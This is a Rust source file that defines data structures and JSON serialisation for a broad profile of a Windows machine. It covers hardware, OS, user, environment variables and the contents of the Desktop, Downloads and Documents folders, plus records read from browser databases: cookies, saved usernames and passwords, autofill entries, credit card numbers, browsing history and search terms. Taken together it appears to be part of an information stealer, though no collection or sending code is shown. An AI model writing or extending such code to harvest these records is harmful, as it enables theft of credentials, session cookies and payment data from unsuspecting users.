use json::{object, JsonValue};
use std::collections::HashMap;

pub struct CpuInfo {
    pub name: WmiValue,
    pub manufacturer: WmiValue,
    pub device_id: WmiValue,
    pub socket_designation: WmiValue,
    pub cores: WmiValue,
    pub threads: WmiValue,
    pub l1_cache_size: u32,
    pub l2_cache_size: u32,
    pub l3_cache_size: u32,
    pub max_clock_speed: WmiValue,
    pub current_clock_speed: WmiValue,
}

impl Into<JsonValue> for CpuInfo {
    fn into(self) -> JsonValue {
        let object = object! {
            "name" => self.name,
            "manufacturer" => self.manufacturer,
            "device_id" => self.device_id,
            "socket_designation" => self.socket_designation,
            "cores" => self.cores,
            "threads" => self.threads,
            "l1_cache_size" => self.l1_cache_size,
            "l2_cache_size" => self.l2_cache_size,
            "l3_cache_size" => self.l3_cache_size,
            "max_clock_speed" => self.max_clock_speed,
            "current_clock_speed" => self.current_clock_speed,
        };

        object
    }
}

pub struct GpuInfo {
    pub name: WmiValue,
    pub adapder_dac_type: WmiValue,
    pub adapter_compatibility: WmiValue,
    pub caption: WmiValue,
    pub description: WmiValue,
    pub device_id: WmiValue,
    pub video_mode_description: WmiValue,
    pub video_processor: WmiValue,
    pub max_refresh_rate: WmiValue,
    pub adapter_ram: WmiValue,
    pub current_bits_per_pixel: WmiValue,
    pub current_horizontal_resolution: WmiValue,
    pub current_vertical_resolution: WmiValue,
    pub current_refresh_rate: WmiValue,
    pub driver_version: WmiValue,
}

impl Into<JsonValue> for GpuInfo {
    fn into(self) -> JsonValue {
        let object = object! {
            "name" => self.name,
            "adapder_dac_type" => self.adapder_dac_type,
            "adapter_compatibility" => self.adapter_compatibility,
            "caption" => self.caption,
            "description" => self.description,
            "device_id" => self.device_id,
            "video_mode_description" => self.video_mode_description,
            "video_processor" => self.video_processor,
            "max_refresh_rate" => self.max_refresh_rate,
            "adapter_ram" => self.adapter_ram,
            "current_bits_per_pixel" => self.current_bits_per_pixel,
            "current_horizontal_resolution" => self.current_horizontal_resolution,
            "current_vertical_resolution" => self.current_vertical_resolution,
            "current_refresh_rate" => self.current_refresh_rate,
            "driver_version" => self.driver_version,
        };

        object
    }
}

pub struct RamInfo {
    pub total: u64,
    pub used: u64,
    pub configured_clock_speed: WmiValue,
    pub speed: WmiValue,
    pub manufacturer: WmiValue,
    pub name: WmiValue,
    pub part_number: WmiValue,
}

impl Into<JsonValue> for RamInfo {
    fn into(self) -> JsonValue {
        let object = object! {
            "total" => self.total,
            "used" => self.used,
            "configured_clock_speed" => self.configured_clock_speed,
            "speed" => self.speed,
            "manufacturer" => self.manufacturer,
            "name" => self.name,
            "part_number" => self.part_number,
        };

        object
    }
}

pub struct DiskInfo {
    pub caption: WmiValue,
    pub description: WmiValue,
    pub device_id: WmiValue,
    pub interface_type: WmiValue,
    pub manufacturer: WmiValue,
    pub media_type: WmiValue,
    pub model: WmiValue,
    pub name: WmiValue,
    pub pnp_device_id: WmiValue,
    pub serial_number: WmiValue,
    pub size: WmiValue,
    pub total_heads: WmiValue,
    pub total_cylinders: WmiValue,
    pub tracks_per_cylinder: WmiValue,
    pub total_tracks: WmiValue,
    pub sectors_per_track: WmiValue,
    pub total_sectors: WmiValue,
    pub bytes_per_sector: WmiValue,
    pub partitions_count: WmiValue,
    pub partitions: Vec<DiskPartition>,
}

impl Into<JsonValue> for DiskInfo {
    fn into(self) -> JsonValue {
        let object = object! {
            "caption" => self.caption,
            "description" => self.description,
            "device_id" => self.device_id,
            "interface_type" => self.interface_type,
            "manufacturer" => self.manufacturer,
            "media_type" => self.media_type,
            "model" => self.model,
            "name" => self.name,
            "pnp_device_id" => self.pnp_device_id,
            "serial_number" => self.serial_number,
            "size" => self.size,
            "total_heads" => self.total_heads,
            "total_cylinders" => self.total_cylinders,
            "tracks_per_cylinder" => self.tracks_per_cylinder,
            "total_tracks" => self.total_tracks,
            "sectors_per_track" => self.sectors_per_track,
            "total_sectors" => self.total_sectors,
            "bytes_per_sector" => self.bytes_per_sector,
            "partitions_count" => self.partitions_count,
            "partitions" => self.partitions,
        };

        object
    }
}

pub struct DiskPartition {
    pub block_size: WmiValue,
    pub bootable: WmiValue,
    pub boot_partition: WmiValue,
    pub caption: WmiValue,
    pub description: WmiValue,
    pub device_id: WmiValue,
    pub disk_index: WmiValue,
    pub name: WmiValue,
    pub primary_partition: WmiValue,
    pub size: WmiValue,
    pub starting_offset: WmiValue,
    pub partition_type: WmiValue,
}

impl Into<JsonValue> for DiskPartition {
    fn into(self) -> JsonValue {
        let object = object! {
            "block_size" => self.block_size,
            "bootable" => self.bootable,
            "boot_partition" => self.boot_partition,
            "caption" => self.caption,
            "description" => self.description,
            "device_id" => self.device_id,
            "disk_index" => self.disk_index,
            "name" => self.name,
            "primary_partition" => self.primary_partition,
            "size" => self.size,
            "starting_offset" => self.starting_offset,
            "partition_type" => self.partition_type,
        };

        object
    }
}

pub struct BatteryInfo {
    pub name: WmiValue,
    pub status: WmiValue,
    pub caption: WmiValue,
    pub description: WmiValue,
    pub device_id: WmiValue,
    pub estimated_charge_remaining: WmiValue,
}

impl Into<JsonValue> for BatteryInfo {
    fn into(self) -> JsonValue {
        let object = object! {
            "name" => self.name,
            "status" => self.status,
            "caption" => self.caption,
            "description" => self.description,
            "device_id" => self.device_id,
            "estimated_charge_remaining" => self.estimated_charge_remaining,
        };

        object
    }
}

pub struct DisplayInfo {
    pub device_id: WmiValue,
    pub screen_height: WmiValue,
    pub screen_width: WmiValue,
    pub caption: WmiValue,
    pub description: WmiValue,
    pub display_type: WmiValue,
    pub monitor_manufacturer: WmiValue,
    pub monitor_type: WmiValue,
    pub name: WmiValue,
    pub pixels_per_x_logical_inch: WmiValue,
    pub pixels_per_y_logical_inch: WmiValue,
    pub status: WmiValue,
}

impl Into<JsonValue> for DisplayInfo {
    fn into(self) -> JsonValue {
        let object = object! {
            "device_id" => self.device_id,
            "screen_height" => self.screen_height,
            "screen_width" => self.screen_width,
            "caption" => self.caption,
            "description" => self.description,
            "display_type" => self.display_type,
            "monitor_manufacturer" => self.monitor_manufacturer,
            "monitor_type" => self.monitor_type,
            "name" => self.name,
            "pixels_per_x_logical_inch" => self.pixels_per_x_logical_inch,
            "pixels_per_y_logical_inch" => self.pixels_per_y_logical_inch,
            "status" => self.status,
        };

        object
    }
}

pub struct NetworkInfo {
    pub name: WmiValue,
    pub product_name: WmiValue,
    pub adapter_type: WmiValue,
    pub caption: WmiValue,
    pub description: WmiValue,
    pub mac_address: WmiValue,
    pub manufacturer: WmiValue,
    pub physical_adapter: WmiValue,
    pub speed: WmiValue,
}

impl Into<JsonValue> for NetworkInfo {
    fn into(self) -> JsonValue {
        let object = object! {
            "name" => self.name,
            "product_name" => self.product_name,
            "adapter_type" => self.adapter_type,
            "caption" => self.caption,
            "description" => self.description,
            "mac_address" => self.mac_address,
            "manufacturer" => self.manufacturer,
            "physical_adapter" => self.physical_adapter,
            "speed" => self.speed,
        };

        object
    }
}

pub struct AudioInfo {
    pub name: WmiValue,
    pub product_name: WmiValue,
    pub caption: WmiValue,
    pub description: WmiValue,
    pub manufacturer: WmiValue,
}

impl Into<JsonValue> for AudioInfo {
    fn into(self) -> JsonValue {
        let object = object! {
            "name" => self.name,
            "product_name" => self.product_name,
            "caption" => self.caption,
            "description" => self.description,
            "manufacturer" => self.manufacturer,
        };

        object
    }
}

pub struct OsInfo {
    pub name: WmiValue,
    pub locale: WmiValue,
    pub version: WmiValue,
    pub timezone: String,
    pub user_name: String,
    pub system_name: WmiValue,
    pub architecture: WmiValue,
    pub serial_number: WmiValue,
    pub user_real_name: String,
    pub registerer_user: WmiValue,
    pub environment_variables: Vec<HashMap<String, String>>,
    pub battery: Vec<BatteryInfo>,
    pub languages: WmiValue,
    pub is_laptop: bool,
}

impl Into<JsonValue> for OsInfo {
    fn into(self) -> JsonValue {
        let object = object! {
            "name" => self.name,
            "locale" => self.locale,
            "version" => self.version,
            "timezone" => self.timezone,
            "user_name" => self.user_name,
            "user_real_name" => self.user_real_name,
            "system_name" => self.system_name,
            "architecture" => self.architecture,
            "serial_number" => self.serial_number,
            "registerer_user" => self.registerer_user,
            "battery" => self.battery,
            "languages" => self.languages,
            "is_laptop" => self.is_laptop,
            "environment_variables" => self.environment_variables,
        };

        object
    }
}

pub struct FilesInfo {
    pub desktop: Vec<String>,
    pub downloads: Vec<String>,
    pub documents: Vec<String>,
}

impl Into<JsonValue> for FilesInfo {
    fn into(self) -> JsonValue {
        let object = object! {
            "desktop" => self.desktop,
            "downloads" => self.downloads,
            "documents" => self.documents,
        };

        object
    }
}

pub struct WmiValue {
    pub value: wmi::Variant,
}

impl Default for WmiValue {
    fn default() -> Self {
        WmiValue {
            value: wmi::Variant::Null,
        }
    }
}

impl Into<JsonValue> for WmiValue {
    fn into(self) -> JsonValue {
        match self.value {
            wmi::Variant::Null => JsonValue::Null,
            wmi::Variant::Empty => JsonValue::Null,
            wmi::Variant::String(val) => val.into(),
            wmi::Variant::Bool(val) => val.into(),
            wmi::Variant::Array(val) => {
                let mut array: Vec<WmiValue> = Vec::new();

                for v in val {
                    array.push(WmiValue { value: v }.into());
                }

                array.into()
            },
            wmi::Variant::Object(_) => {
                let object = object! {};

                object.into()
            },
            wmi::Variant::I1(val) => val.into(),
            wmi::Variant::I2(val) => val.into(),
            wmi::Variant::I4(val) => val.into(),
            wmi::Variant::I8(val) => val.into(),
            wmi::Variant::UI1(val) => val.into(),
            wmi::Variant::UI2(val) => val.into(),
            wmi::Variant::UI4(val) => val.into(),
            wmi::Variant::UI8(val) => val.into(),
            wmi::Variant::R4(val) => val.into(),
            wmi::Variant::R8(val) => val.into(),
            _ => JsonValue::Null,
        }
    }
}
pub struct SqlValue {
    pub value: rusqlite::types::Value,
}

impl Default for SqlValue {
    fn default() -> Self {
        SqlValue {
            value: rusqlite::types::Value::Null,
        }
    }
}

impl Into<JsonValue> for SqlValue {
    fn into(self) -> JsonValue {
        match self.value {
            rusqlite::types::Value::Null => JsonValue::Null,
            rusqlite::types::Value::Integer(i) => i.into(),
            rusqlite::types::Value::Real(f) => f.into(),
            rusqlite::types::Value::Text(s) => s.into(),
            rusqlite::types::Value::Blob(b) => b.into(),
        }
    }
}

pub struct CookiesData {
    pub creation_utc: SqlValue,
    pub host_key: SqlValue,
    pub top_frame_site_key: SqlValue,
    pub name: SqlValue,
    pub value: SqlValue,
    pub path: SqlValue,
    pub expires_utc: SqlValue,
    pub is_secure: SqlValue,
    pub is_http_only: SqlValue,
    pub last_access_utc: SqlValue,
    pub has_expires: SqlValue,
    pub is_persistent: SqlValue,
    pub priority: SqlValue,
    pub same_site: SqlValue,
    pub source_scheme: SqlValue,
    pub source_port: SqlValue,
    pub last_update_utc: SqlValue,
}

impl Into<JsonValue> for CookiesData {
    fn into(self) -> JsonValue {
        let object = object! {
            "creation_utc" => self.creation_utc,
            "host_key" => self.host_key,
            "top_frame_site_key" => self.top_frame_site_key,
            "name" => self.name,
            "value" => self.value,
            "path" => self.path,
            "expires_utc" => self.expires_utc,
            "is_secure" => self.is_secure,
            "is_http_only" => self.is_http_only,
            "last_access_utc" => self.last_access_utc,
            "has_expires" => self.has_expires,
            "is_persistent" => self.is_persistent,
            "priority" => self.priority,
            "same_site" => self.same_site,
            "source_scheme" => self.source_scheme,
            "source_port" => self.source_port,
            "last_update_utc" => self.last_update_utc,
        };

        object
    }
}

pub struct PasswordsData {
    pub origin_url: SqlValue,
    pub action_url: SqlValue,
    pub username_value: SqlValue,
    pub password_value: SqlValue,
    pub date_created: SqlValue,
    pub blacklisted_by_user: SqlValue,
    pub scheme: SqlValue,
    pub password_type: SqlValue,
    pub times_used: SqlValue,
    pub form_data: SqlValue,
    pub display_name: SqlValue,
    pub possible_username_pairs: SqlValue,
    pub date_last_used: SqlValue,
    pub date_password_modified: SqlValue,
    pub sender_email: SqlValue,
    pub sender_name: SqlValue,
    pub date_received: SqlValue,
}

impl Into<JsonValue> for PasswordsData {
    fn into(self) -> JsonValue {
        let object = object! {
            "origin_url" => self.origin_url,
            "action_url" => self.action_url,
            "username_value" => self.username_value,
            "password_value" => self.password_value,
            "date_created" => self.date_created,
            "blacklisted_by_user" => self.blacklisted_by_user,
            "scheme" => self.scheme,
            "password_type" => self.password_type,
            "times_used" => self.times_used,
            "form_data" => self.form_data,
            "display_name" => self.display_name,
            "possible_username_pairs" => self.possible_username_pairs,
            "date_last_used" => self.date_last_used,
            "date_password_modified" => self.date_password_modified,
            "sender_email" => self.sender_email,
            "sender_name" => self.sender_name,
            "date_received" => self.date_received,
        };
        object
    }
}

pub struct AutofillData {
    pub name: SqlValue,
    pub value: SqlValue,
    pub value_lower: SqlValue,
    pub date_created: SqlValue,
    pub date_last_used: SqlValue,
    pub count: SqlValue,
}

impl Into<JsonValue> for AutofillData {
    fn into(self) -> JsonValue {
        let object = object! {
            "name" => self.name,
            "value" => self.value,
            "value_lower" => self.value_lower,
            "date_created" => self.date_created,
            "date_last_used" => self.date_last_used,
            "count" => self.count,
        };
        object
    }
}

pub struct CreditCardData {
    pub guid: SqlValue,
    pub name_on_card: SqlValue,
    pub expiration_month: SqlValue,
    pub expiration_year: SqlValue,
    pub card_number: SqlValue,
    pub date_modified: SqlValue,
    pub origin: SqlValue,
    pub use_count: SqlValue,
    pub use_date: SqlValue,
    pub billing_address_id: SqlValue,
    pub nickname: SqlValue,
}

impl Into<JsonValue> for CreditCardData {
    fn into(self) -> JsonValue {
        let object = object! {
            "guid" => self.guid,
            "name_on_card" => self.name_on_card,
            "expiration_month" => self.expiration_month,
            "expiration_year" => self.expiration_year,
            "card_number" => self.card_number,
            "date_modified" => self.date_modified,
            "origin" => self.origin,
            "use_count" => self.use_count,
            "use_date" => self.use_date,
            "billing_address_id" => self.billing_address_id,
            "nickname" => self.nickname,
        };
        object
    }
}

pub struct AddressData {
    pub guid: SqlValue,
    pub use_count: SqlValue,
    pub use_date: SqlValue,
    pub date_modified: SqlValue,
    pub language_code: SqlValue,
    pub label: SqlValue,
}

impl Into<JsonValue> for AddressData {
    fn into(self) -> JsonValue {
        let object = object! {
            "guid" => self.guid,
            "use_count" => self.use_count,
            "use_date" => self.use_date,
            "date_modified" => self.date_modified,
            "language_code" => self.language_code,
            "label" => self.label,
        };
        object
    }
}

pub struct HistoryData {
    pub url: SqlValue,
    pub title: SqlValue,
    pub visit_count: SqlValue,
    pub typed_count: SqlValue,
    pub last_visit_time: SqlValue,
    pub hidden: SqlValue,
}

impl Into<JsonValue> for HistoryData {
    fn into(self) -> JsonValue {
        let object = object! {
            "url" => self.url,
            "title" => self.title,
            "visit_count" => self.visit_count,
            "typed_count" => self.typed_count,
            "last_visit_time" => self.last_visit_time,
            "hidden" => self.hidden,
        };
        object
    }
}

pub struct DownloadHistoryData {
    pub id: SqlValue,
    pub guid: SqlValue,
    pub current_path: SqlValue,
    pub target_path: SqlValue,
    pub referrer: SqlValue,
    pub site_url: SqlValue,
    pub mime_type: SqlValue,
    pub original_mime_type: SqlValue,
}


impl Into<JsonValue> for DownloadHistoryData {
    fn into(self) -> JsonValue {
        let object = object! {
            "id" => self.id,
            "guid" => self.guid,
            "current_path" => self.current_path,
            "target_path" => self.target_path,
            "referrer" => self.referrer,
            "site_url" => self.site_url,
            "mime_type" => self.mime_type,
            "original_mime_type" => self.original_mime_type,
        };
        object
    }
}

pub struct KeywordsData {
    pub keyword_id: SqlValue,
    pub url_id: SqlValue,
    pub term: SqlValue,
    pub normalized_term: SqlValue,
}

impl Into<JsonValue> for KeywordsData {
    fn into(self) -> JsonValue {
        let object = object! {
            "keyword_id" => self.keyword_id,
            "url_id" => self.url_id,
            "term" => self.term,
            "normalized_term" => self.normalized_term,
        };
        object
    }
}